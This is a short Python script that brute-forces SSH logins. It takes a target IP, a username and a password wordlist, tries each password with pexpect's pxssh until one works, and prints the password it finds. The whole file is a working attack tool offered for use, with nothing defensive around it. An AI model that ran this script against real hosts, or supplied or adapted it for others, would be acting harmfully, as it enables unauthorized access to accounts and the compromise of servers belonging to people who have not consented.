# Author: ErikDM
# Date: 05/01-2018
# SSH Brute force application
# Developed for Linux
# Usage: python3 ssh_brute.py TargetIP Username /Path/To/Wordlist.txt

from pexpect import pxssh
import time, sys

print("\n###############\nSSH Brute Force\n###############\n")

try:
	hostname, username, wordlist = sys.argv[1], sys.argv[2], sys.argv[3]
except:
	print("Usage: python3 ssh_brute.py TargetIP Username /Path/To/Wordlist.txt")
	sys.exit()

print("Starting at: " + time.ctime() + "\n")
attack = False

with open(wordlist) as dictionary:
	while attack is False:
			for password in dictionary:
					try:
						s = pxssh.pxssh()
						print("Trying password: " + password.rstrip())
						s.login(hostname, username, password)
						attack = True
						break
					except:
						s.close()

print("\n[+] Password found: " + password.rstrip()), s.close()
print("Finished at: " + time.ctime())
